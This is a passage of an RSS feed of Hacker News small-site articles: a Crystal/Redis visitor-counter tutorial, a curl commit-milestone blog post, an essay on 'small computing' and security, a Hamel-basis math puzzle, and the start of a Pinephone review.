src="https://www.techprowd.com/content/images/2020/09/carbon--31-.png" alt="carbon--31-"></a></p>
<!--kg-card-end: markdown--><p>Running the main code now we should see the counter working as expected:</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-80.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-80.png 600w, https://www.techprowd.com/content/images/2020/09/image-80.png 801w"></figure><figure><img src="https://www.techprowd.com/content/images/2020/09/image-79.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-79.png 600w, https://www.techprowd.com/content/images/2020/09/image-79.png 612w"></figure><p>Notice the response times of the web request! It's around 1ms per request! That's crazy fast... But wait, it's not built correctly.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-81.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-81.png 600w, https://www.techprowd.com/content/images/2020/09/image-81.png 829w"></figure><p>Now that's what I call FAST!</p><figure><img src="https://www.techprowd.com/content/images/2020/09/source-1.gif" alt=""></figure><p>Just one issue... While running Apache benchmarks, I noticed that the total visit counter is increasing at every request, which is right, but it can be easily abused. We need to rate-limit the total visit counter so that a single IP address can have only one visit per X amount of time.</p><p>Easy, he said! Remember, we are using Redis for our storage, and Redis has a Keys with Expiration feature. Which is precisely what we need.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=crystal&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=private%2520def%2520increase_total_visits(ip)%250A%2520%2520%2520%2520if%2520%2540redis.exists(%2522!%2523%257Bip%257D%2522)%2520%253D%253D%25200%250A%2520%2520%2520%2520%2520%2520%2520%2520%2540redis.incr(TOTAL_VISITS_KEY).to_i%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2540redis.set(%2522!%2523%257Bip%257D%2522%252C%25201%252C%2520RATE_LIMIT_SECONDS)%250A%2520%2520%2520%2520end%250Aend"><img src="https://www.techprowd.com/content/images/2020/09/carbon--37-.png" alt="carbon--37-"></a></p>
<!--kg-card-end: markdown--><p>This way now only increases total visits only when the rate limit timeout will be reached; in this code, it's 5 seconds, but I am going to set something like 1 minute in production.</p><p>Now that we have our application working as we expect. We should deploy our application. I am going to follow the official <a href="https://crystal-lang.org/2016/05/26/heroku-buildpack.html">Crystal guide for Heroku deployment</a>.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-82.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-82.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-82.png 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/image-82.png 1600w, https://www.techprowd.com/content/images/2020/09/image-82.png 1676w" sizes="(min-width: 1200px) 1200px"></figure><p>After easy set up and install now we have an working counter running on heroku.</p><p><a href="https://immense-beyond-23382.herokuapp.com/">https://immense-beyond-23382.herokuapp.com/</a></p><!--kg-card-begin: html--><p><img src="https://immense-beyond-23382.herokuapp.com/"></p><!--kg-card-end: html--><h2 id="conclusion">Conclusion</h2><p>The fully working source code is available on my <a href="https://www.patreon.com/posts/41771991">Patreon account</a> for all pledgers. I will try to add this small counter to this Ghost template as I really loved the idea of this small counter 15 years ago.</p><p>Don't forget to subscribe to the newsletters down bellow. Every new article will be delivered in a friendly email, readable format straight into your mailbox!</p>
                </div>
            </section>

                <section>
    <h3>Subscribe to techprowd</h3>
    <p>Get the latest posts delivered right to your inbox</p>
    <form data-members-form="subscribe">
        
        <p><strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
        </p>
        <p>
            Please enter a valid email address!
        </p>
    </form>
</section>
            

        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://www.techprowd.com/evening-project-a-crystal-based-super-fast-visitor-counter/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525873</guid>
            <pubDate>Sat, 19 Sep 2020 07:43:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My first 15000 curl commits]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24525665">thread link</a>) | @dosshell
<br/>
September 18, 2020 | https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/ | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>I‚Äôve long maintained that <strong>persistence</strong> is one of the main qualities you need in order to succeed with your (software) project. In order to manage to ship a product that truly conquers the world. By continuously and never-ending keeping at it: polishing away flaws and adding good features. On and on and on.</p>



<p>Today marks the day when I landed my 15,000th commit in the <a href="https://github.com/curl/curl">master branch in curl‚Äôs git repository</a> ‚Äì and we don‚Äôt do merge commits so this number doesn‚Äôt include such. Funnily enough, <a href="https://github.com/curl/curl/graphs/contributors">GitHub can‚Äôt count</a> and shows a marginally lower number.</p>



<figure><img loading="lazy" width="844" height="116" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits.png 844w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-450x62.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-200x27.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-768x106.png 768w" sizes="(max-width: 844px) 100vw, 844px"></figure>



<p>This is of course a totally meaningless number and I‚Äôm only mentioning it here because it‚Äôs even and an opportunity for me to celebrate something. To cross off an imaginary milestone. This is not even a year since we passed <a href="https://daniel.haxx.se/blog/2019/11/29/curl-25000-commits/" data-type="post" data-id="12859">25,000 total number of commits</a>. Another meaningless number.</p>



<p>15,000 commits equals 57% of all commits done in curl so far and it makes me the only committer in the curl project with over 10% of the commits.</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#daniel-vs-rest"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>The curl git history starts on December 29 1999, so the first 19 months of commits from the early curl history are lost. 15,000 commits over this period equals a little less than 2 commits per day on average. I reached 10,000 commits  in December 2011, so the latest 5,000 commits were done at a slower pace than the first 10,000.</p>



<p>I estimate that I‚Äôve spent more than 15,000 hours working on curl over this period, so it would mean that I spend more than one hour of ‚Äúcurl time‚Äù per commit on average. According to <a href="https://curl.haxx.se/gitstats/authors.html">gitstats</a>, these 15,000 commits were done on 4,271 different days.</p>



<p>We also have other curl repositories that aren‚Äôt included in this commit number. For example, I have done over 4,400 commits in curl‚Äôs website repository.</p>



<p>With these my first 15,000 commits I‚Äôve added 627,000 lines and removed 425,000, making an average commit adding 42 and removing 28 lines. (Feels pretty big but I figure the really large ones skew the average.)</p>



<p>The largest time gap ever between two of my commits in the curl tree is almost 35 days back in June 2000. If we limit the check to ‚Äúmodern times‚Äù, as in 2010 or later, there was a 19 day gap in July 2015. I <em>do</em> take vacations, but I usually keep up with the most important curl development even during those.</p>



<p>On average it is one commit done by me every 12.1 hours. Every 15.9 hours since 2010. </p>



<p>I‚Äôve been working <a href="https://daniel.haxx.se/blog/2019/02/02/im-on-team-wolfssl/" data-type="post" data-id="11915">full time on curl since early 2019</a>, up until then it was a spare time project only for me. Development with pull-requests and CI and things that verify a lot of the work <em>before</em> merge is a recent thing so one explanation for a slightly higher commit frequency in the past is that we then needed more ‚Äúoops‚Äù commits to rectify mistakes. These days, most of them are done in the PR branches that are squashed when subsequently merged into master. Fewer commits with higher quality.</p>



<h2>curl committers</h2>



<p>We have merged commits authored by over 833 authors into the curl master repository.  Out of these, 537 landed only a single commit (so far).</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#authors"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>We are 48 authors who ever wrote 10 or more commits within the same year. 20 of us committed that amount of commits during more than one year.</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#coreteam-per-year"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>We are 9 authors who wrote more than 1% of the commits each.</p>



<p>We are 5 authors who ever wrote 10 or more commits within the same year in 10 or more years.</p>



<p>Our second-most committer (by commit count) has not merged a commit for over seven years.</p>



<p>To reach curl‚Äôs top-100 committers list right now, you only need to land 6 commits.</p>



<h2>can I keep it up?</h2>



<p>I intend to stick around in the curl project going forward as well. If things just are this great and life remains fine, I hope that I will be maintaining roughly this commit speed for years to come. My prediction is therefore that it will take longer than another twenty years to reach 30,000 commits.</p>



<p>I‚Äôve worked on curl and its precursors for almost <em>twenty-four years</em>. In another twenty-four years I will be well into my retirement years. At some point I will probably not be fit to shoulder this job anymore!</p>



<p>I have never planned long ahead before and I won‚Äôt start now. I will instead keep focused on keeping curl top quality, an exemplary open source project and a welcoming environment for newcomers and oldies alike. I will continue to make sure the project is able to function totally independently if I‚Äôm present or not.</p>



<h2>The 15,000th commit?</h2>



<p>So what exactly did I change in the project when I merged my 15,000th ever change into the branch?</p>



<p>It was a pretty boring and <a href="https://github.com/curl/curl/commit/559ed3ca2545c56a9acc4e805970434f657bd691">non-spectacular one</a>. I removed a document (<code>RESOURCES</code>) from the docs/ folder as that has been a bit forgotten and now is just completely outdated. There‚Äôs a much better page for this provided on the web site: <a href="https://curl.haxx.se/rfc/">https://curl.haxx.se/rfc/</a></p>



<h2>Celebrations!</h2>



<p>I of coursed asked my twitter friends a few days ago on how this occasion is best celebrated:</p>



<figure><a href="https://twitter.com/bagder/status/1302345161272418307"><img loading="lazy" width="825" height="493" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish.png 825w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-450x269.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-200x120.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-768x459.png 768w" sizes="(max-width: 825px) 100vw, 825px"></a></figure>



<p>I showed these results to my wife. She approved.</p>
	</div></div>]]>
            </description>
            <link>https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525665</guid>
            <pubDate>Sat, 19 Sep 2020 06:43:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Small Computing and the Security Mindset]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24525475">thread link</a>) | @zdw
<br/>
September 18, 2020 | http://www.lord-enki.net/medium-backup/2020-09-18_Small-Computing-and-the-Security-Mindset-821dfb512aa7.html | <a href="https://web.archive.org/web/*/http://www.lord-enki.net/medium-backup/2020-09-18_Small-Computing-and-the-Security-Mindset-821dfb512aa7.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<header>

</header>
<section data-field="subtitle">
The story of modern computing is the story of the big-computing mindset (scale, centralization, elitism, and paternalism) infecting‚Ä¶
</section>
<section data-field="body">
<section name="3648"><div><div><h3 name="8f02" id="8f02">Small Computing and the Security&nbsp;Mindset</h3><p name="3181" id="3181">The story of modern computing is the story of the big-computing mindset (scale, centralization, elitism, and paternalism) infecting everything it touches as programming becomes more of a profession than a craft. In the process, it creates edifices of practices‚Ää‚Äî‚Ääuseful in big-computing situations‚Ää‚Äî‚Ääthat get unthinkingly applied outside of their appropriate bounds, forcing small-computing projects into the strictures of big-computing design. One major domain where we must begin to think critically about the big- vs small-computing distinction is security.</p><p name="46d1" id="46d1">Small-computing systems ought to be secure. After all, they are our most personal environments! They are our diaries and our artworks and our dream journals! But computer security, as it has become professionalized, has become more and more focused on big-computing environments, and good security practices in those environments are inimical to the basic tenets of small computing.</p><p name="369b" id="369b">In a big-computing environment, valuable secrets (like credit card numbers) and desirable powers (like the ability to tweet on behalf of the president) are kept on a set of machines owned by a single entity (the corporation) on behalf of the ostensible owners of that information and power (particular end-users) and protected from illegitimate access (hacking/cracking) by an elite set of professionals (software engineers, ops teams, security consultants) who use their monopoly on legitimate access to certain power (superuser &amp; administrator privileges, commit access) to construct laws (security policies) that prohibit as many not-explicitly-allowed operations as possible. Because the adversaries are many, with infinite time and energy, and because the treasure is valuable, and because laws always have unseen loopholes, these elite professionals construct layers upon layers of rules to limit not only what users (legitimate or illegitimate) can do, but what kind of feedback they can receive.</p><p name="c145" id="c145">This mentality has even made its way into language design: Java (and C++) have a rudimentary form of access control where members can be marked private, and good style in these languages is to mark all member data as private and write accessor functions, ostensibly in order to perform validity checks on proposed modification. This boilerplate is added rather than doing the sensible thing and creating custom metatables such that assignments are implicitly passed through an integrity check (as may be done in Python and Lua). Of course, such checks are rarely implemented, and they cannot distinguish between ‚Äòauthorized‚Äô and ‚Äòunauthorized‚Äô calling-classes anyhow‚Ää‚Äî‚Ääwhile C++ has ‚Äòfriend classes‚Äô that can modify private data directly, and both support using inheritance hierarchies to control data access, there is no granularity smaller than kin/friend versus outsider, so these access controls are borderline useless for everything besides the ad-hoc plugging failures of the type system and increasing the line count of codebases.</p><p name="c4c2" id="c4c2">Systems that require big-computing style security exist. Problems that are best suited to those systems also exist‚Ää‚Äî‚Ääyour bank ought to not only have big-computing style security, but ought to have substantially better security than it has. But, this model is not really sensible in many of the places it is used. For instance, Google Docs (which simulates a word processor with some limited support for simultaneous editing by multiple users) is locked into this model only because it is client-server, and a hypothetical local-first or peer-to-peer version should not be so professionalized and stratified; Microsoft Word, being a local application, has no legitimate excuse (though the real reason, as with most big-computing systems, is that unnecessary centralization is a very effective way to squeeze money out of users who don‚Äôt know any better).</p><p name="d95a" id="d95a">When I use Google Docs, I can modify the javascript running on my browser, modify the cookies being sent to the server, and modify URL parameters. If I do something wrong, I will get an entirely unhelpful error message from inside the black box of the remote server. This is because, by failing to fall precisely in line with the Alphabet Corporation‚Äôs desired behavior, I have become an adversary, and adversaries cannot be given information that might help them do whatever they might want to do (since some of the things they might want to do is get, for instance, the credit card numbers of everyone who has ever bought an advertisement). Of course, Google engineers writing and maintaining Google Docs face the same situation. Outside of an adversarial situation, investigating a poorly-understood piece of code by poking it and interpreting error messages is called debugging, and part of the small computing ethos is that users should not be prevented from debugging.</p><p name="05d7" id="05d7">The difference between big computing and small computing is, in essence, that in small computing, the user is never an adversary. This is because the running code is owned and controlled by the user. This goes beyond open source / free software (where the developer is no adversary, but the developer is an elite professional often working on behalf of a corporation inside a firewall, performing work that may well be detrimental to those who actually need to interact with its effects).</p><p name="bd41" id="bd41">What kinds of structures befit a small-computing system in an environment where networking exists, and what security models are appropriate for these structures?</p><p name="8df4" id="8df4">For one thing, a multi-user client-server model makes no sense. In a client-server model, whoever controls the single server functionally controls all clients. There is, therefore, incentive to hoard power by locking vital functionalities away on the shared server, making every client dependent‚Ää‚Äî‚Ääslowed by latency when online, shit out of luck when offline, and always under threat of sudden unilateral changes in policy or protocol.</p><p name="d853" id="d853">Instead, we should look to peer to peer systems: direct for real-time communication, and offline-first store-and-forward schemes for everything else. Asymmetric encryption for key exchange and for signing still make sense here, as does hash-based content addressing for storage. Secure Scuttlebutt and IPFS are good models for what small-computing-oriented network technologies of the future might look like: fully distributed, yet resistant to the kinds of threats that regularly take down federated systems like ActivityPub and IRC, because all nodes are equal and all nodes replicate for each other (under cryptographically-enforced anti-spoofing measures).</p><p name="32c0" id="32c0">What does a threat model for small-computing infrastructure look like?</p><p name="2535" id="2535">Well, unlike in big-computing systems, a small-computing system does not (typically) have large numbers of highly motivated dedicated attackers. Fuzzy Bear isn‚Äôt APTing your grandma‚Äôs laptop, because your grandma‚Äôs laptop has nothing on it but christmas MIDIs and questionable nudes. Our threat is really from folks doing large-scale automated sweeps for low-hanging fruit. So, small-computing threat modeling looks like everyday opsec: use encryption, don‚Äôt give strangers direct access to private spaces and limit the spaces they do have access to, distinguish between sensitive and non-sensitive data, and protect the integrity of the system from outsiders. Protect the network-facing portion of your machine, while maximizing your own access to it.</p><p name="aa5a" id="aa5a">In this context, technologies we absolutely do not need are: passwords, SSO, certificate authority hierarchies, name servers and host files, NAT firewalls, code signing, chroot jails, memory layout randomizers, executable symbol stripping, single-application containers, daemons running as ‚Äònobody‚Äô, web APIs for wrapping the web APIs around your web APIs, friend classes, and sudo.</p><p name="9477" id="9477">Technologies we might want to look into: distributed hash tables, chord routing, merkel trees, functional languages, JIT, fast copy-on-write, network-aware cache eviction policies, split-brain countermeasures, transitive blocking, store and forward, message passing, microversioning, journaling, and image-based environments.</p></div></div></section>
</section>
</article></div>]]>
            </description>
            <link>http://www.lord-enki.net/medium-backup/2020-09-18_Small-Computing-and-the-Security-Mindset-821dfb512aa7.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525475</guid>
            <pubDate>Sat, 19 Sep 2020 05:54:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[From Vector Spaces to Periodic Functions]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24525383">thread link</a>) | @susam
<br/>
September 18, 2020 | https://susam.in/blog/from-vector-spaces-to-periodic-functions/ | <a href="https://web.archive.org/web/*/https://susam.in/blog/from-vector-spaces-to-periodic-functions/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>By <b>Susam Pal</b> on 30 Jan 2019</p>
<h2 id="vector-spaces"><a href="#vector-spaces">Vector Spaces</a></h2>
<p>
A fascinating result that appears in linear algebra is the fact that the
set of real numbers \( \mathbb{R} \) is a vector space over the set of
rational numbers \( \mathbb{Q}. \) This may appear surprising at first
but it is easy to show that it is indeed so by checking that all eight
axioms of vector spaces hold good:
</p>

<ol>
  <li>
    <p>
      Commutativity of vector addition:<br>
      \( x + y = y + x \) for all \( x, y \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Associativity of vector addition:<br>
      \( x + (y + z) = (x + y) + z \) for all \( x, y, z \in \mathbb{R}.
      \)
    </p>
  </li>
  <li>
    <p>
      Existence of additive identity vector:<br>
      We have \( 0 \in \mathbb{R} \) such that \( x + 0 = x \) for all
      \( x \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Existence of additive inverse vectors:<br>
      There exists \( -x \in \mathbb{R} \) for all \( x \in \mathbb{R}.
      \)
    </p>
  </li>
  <li>
    <p>
      Associativity of scalar multiplication:<br>
      \( a(bx) = (ab)x \) for all \( a, b \in \mathbb{Q} \) and for all
      \( x \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Distributivity of scalar multiplication over vector addition:<br>
      \( a(x + y) = ax + by \) for all \( a \in \mathbb{Q} \) and for
      all \( x, y \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Distributivity of scalar multiplication over scalar addition:<br>
      \( (a + b)x = ax + bx \) for all \( a, b \in \mathbb{Q} \) and for
      all \( x \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Existence of scalar multiplicative identity:<br>
      We have \( 1 \in \mathbb{Q} \) such that \( 1 \cdot x = x \) for
      all \( x \in \mathbb{R}. \)
    </p>
  </li>
</ol>
<p>
  This shows that the set of real numbers \( \mathbb{R} \) forms a
  vector space over the field of rational numbers \( \mathbb{Q}. \)
  Another quick way to arrive at this fact is to observe that \(
  \mathbb{Q} \subseteq \mathbb{R}, \) that is, \( \mathbb{Q} \) is a
  subfield of \( \mathbb{R}. \) Any field is a vector space over any of
  its subfields, so \( \mathbb{R} \) must be a vector space over \(
  \mathbb{Q}. \)
</p>


<h2 id="problem"><a href="#problem">Problem</a></h2>

<p>
Here is an interesting problem related to vector spaces that I came
across recently:
</p>

<div>
<p>
Define two periodic functions \( f \) and \( g \) from \( \mathbb{R} \)
to \( \mathbb{R} \) such that their sum \( f + g \) is the identity
function. The axiom of choice is allowed.
</p>
<p>
A function \( f \) is periodic if there exists \( p \gt 0 \) such that
\( f(x + p) = f(x) \) for all \( x \) in the domain.
</p>
</div>

<p>
<em>
If you want to think about this problem, this is a good time to pause
and think about it. There are spoilers ahead.
</em>
</p>


<h2 id="solution"><a href="#solution">Solution</a></h2>

<p>
The axiom of choice is equivalent to the statement that every vector
space has a basis. Since the set of real numbers \( \mathbb{R} \) is a
vector space over the set of rational numbers \( \mathbb{Q}, \) there
must be a basis \( \mathcal{H} \subseteq \mathbb{R} \) such that every
real number \( x \) can be written uniquely as a finite linear
combination of elements of \( \mathcal{H} \) with rational coefficients,
that is,
\[
  x = \sum_{a \in \mathcal{H}} x_a a
\]
where each \( x_a \in \mathbb{Q} \) and \( \{ a \in \mathcal{H} \mid x_a
\ne 0 \} \) is finite. The set \( \mathcal{H} \) is also known as the
Hamel basis.
</p>

<p>
We know that \( b_a = 0 \) for distinct \( a, b \in \mathcal{H} \)
because \( a \) and \( b \) are basis vectors.
</p>

<p>
In the above expansion of \( x, \) each \( x_a \) is a rational number
that appears as the coefficient of the basis vector \( a. \) Therefore
\( (x + y)_{a} = x_a + y_a \) for all \( x, y \in \mathbb{R}. \) Thus \(
(x + b)_{a} = x_a + b_a = x_a + 0 = x_a. \) This shows that a function
\( f(x) = x_a \) is a periodic function with period \( b \) for any \( b
\in \mathcal{H} \setminus \{a\}. \)
</p>

<p>
Let us define two functions:
\begin{align*}
  f(x) &amp; = \sum_{a \in \mathcal{H} \setminus \{ b \}} x_a a,
  &amp;
  g(x) &amp; = x_b b.
\end{align*}
where \( b \in \mathcal{H} \) and \( x \in \mathbb{R}. \) Let us
choose \( c \in \mathcal{H} \) such that \( c \ne b. \) Then \( f(x) \)
is a periodic function with period \( b \) and \( g(x) \) is a periodic
function with period \( c. \) Further,
\[
  f(x) + g(x)
  = \left( \sum_{a \in \mathcal{H} \setminus \{ b \}} x_a a \right) + x_b b
  = \sum_{a \in \mathcal{H}} x_a a
  = x.
\]
Thus \( f(x) \) and \( g(x) \) are two periodic functions such that
their sum is the identity function.
</p>


<h2 id="references"><a href="#references">References</a></h2>
<ul>
  <li>
    <a href="https://mathworld.wolfram.com/VectorSpace.html">Vector
    Space</a> (by Eric W. Weisstein)
  </li>
  <li>
    <a href="https://web.archive.org/web/20141026224511/https://drexel28.wordpress.com/2010/10/22/the-dimension-of-r-over-q/">The
    Dimension of R over Q</a> (by Alex Youcis)
  </li>
  <li>
    <a href="https://mathblag.wordpress.com/2013/09/01/sums-of-periodic-functions/">Sums
  of Periodic Functions</a> (by David Radcliffe)
  </li>
</ul>



</div></div>]]>
            </description>
            <link>https://susam.in/blog/from-vector-spaces-to-periodic-functions/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525383</guid>
            <pubDate>Sat, 19 Sep 2020 05:29:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hand-Optimizing VLIW Assembly Language as a Game]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 6 (<a href="https://news.ycombinator.com/item?id=24525372">thread link</a>) | @luu
<br/>
September 18, 2020 | http://silverspaceship.com/hovalaag/ | <a href="https://web.archive.org/web/*/http://silverspaceship.com/hovalaag/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://silverspaceship.com/hovalaag/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525372</guid>
            <pubDate>Sat, 19 Sep 2020 05:27:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Review of Pinephone PostmarketOS CE]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24525210">thread link</a>) | @vidak
<br/>
September 18, 2020 | https://proxy.vulpes.one/gemini/tanelorn.city/~vidak/pinephone/pinephone-review.gemini | <a href="https://web.archive.org/web/*/https://proxy.vulpes.one/gemini/tanelorn.city/~vidak/pinephone/pinephone-review.gemini">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div><p>The version of the Pinephone that I am reviewing is the postmarketOS</p><p>Community Edition (CE).</p><p>My first impression of the Pinephone after I unboxed the device was</p><p>very good. I enjoyed the feeling of the weight of the Pinephone in my</p><p>hand, and the overall build quality of the system still impresses</p><p>me. It is my opinion that the PINE64 hardware development and</p><p>manufacturing process is very solid. For what I paid, which was about</p><p>AUD$200 all up, I believe I have received hardware that is superior</p><p>than a phone that I could have bought from a retail store in my city</p><p>for the same price.</p><p>The screen is glossy, and the capacitive touch screen (this is a</p><p>question fellow smolnet citizen Shufei wanted answered in some detail)</p><p>responds well.</p><p>I was, however, disappointed with the stock postmarketOS software that</p><p>came flashed on the eMMC. The Software Centre was a particular</p><p>disappointment. It, by default, only showed the currently installed</p><p>software, and it was not possible to browse any other software which</p><p>was not already installed.</p><p>Also, the camera application that came installed by default, 'Cheese',</p><p>did not allow the camera to function.</p><p>I attempted to install Plasma Mobile using the command line, following</p><p>these instructions:</p><p>But it ended up completely wrecking the function of the</p><p>phone. Installing the package that the wiki article recommended did</p><p>not update LightDM, and I ended up soft-bricking the phone while</p><p>fiddling with the LightDM configuration in order to stop the phone</p><p>from (still) booting into phosh, and not Plasma Mobile.</p><p>It also disabled cell data functionality, and ended up messing with a</p><p>lot of the guts of the Linux installation. So I do not recommend</p><p>attempting to switch to Plasma Mobile on the Pinephone from inside an</p><p>already-existing postmarketOS installation. I recommend getting a</p><p>Plasma Mobile system image, and flashing that from the start if you</p><p>wish to experiment with different user interfaces.</p><div><p><span> ##</span></p><h2>Linux Software Distributions</h2></div><p>There is a great many Linux distributions available for the</p><p>Pinephone. The following link to the PINE64 wiki contains a</p><p>more-or-less exhaustive list of each of them:</p><p>The Linux distributions that I tested out are:</p><div><p><span>###</span></p><h3>postmarketOS (phosh UI)</h3></div><p>I enjoyed this system image because it came with a wizard for</p><p>NetworkManager which enabled me to make sure cell data worked most</p><p>consistently. However, the power consumption of this image was</p><p>prohibitively high, and it caused the phone to run very hot. When the</p><p>battery was at 10% charge, rebooting the phone would cause the last of</p><p>this precious charge to be used up, and the phone would run completely</p><p>out of power.</p><p>This image was basically a desktop UI, and did not have many, if any</p><p>mobile UI configurations present. It was rather fun to see the</p><p>Pinephone boot into a full GNOME desktop environment. I imagine if you</p><p>had a bigger screen connected to the Pinephone, you would be quite</p><p>impressed with what this phone could pull off.</p><div><p><span>###</span></p><h3>postmarketOS (Plasma Mobile)</h3></div><p>Slow and buggy, really.</p><p>This distribution has a major problem at the moment: the unlock/power</p><p>button is not properly debounced, and it makes it virtually impossible</p><p>sometimes to unlock 